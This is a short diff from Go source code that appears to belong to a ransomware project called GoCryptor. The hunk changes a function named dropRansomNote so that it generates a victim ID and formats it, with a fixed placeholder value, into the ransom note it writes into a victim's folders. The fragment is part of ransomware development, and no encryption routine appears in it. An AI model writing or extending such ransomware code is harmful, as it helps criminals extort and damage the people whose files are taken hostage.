@@ -220,8 +220,9 @@ func dropRansomNote(folderDir string) {
 	}
 
 	defer ransomNote.Close()
-
-	_, err2 := ransomNote.WriteString(string(GoCryptorConfig.ransomNoteContent))
+	victimID, _ := generateVictimID()
+	strRansomNoteContent := fmt.Sprintf(string(GoCryptorConfig.ransomNoteContent), victimID, 0x69696969)
+	_, err2 := ransomNote.WriteString(strRansomNoteContent)
 
 	if err2 != nil {
 		return
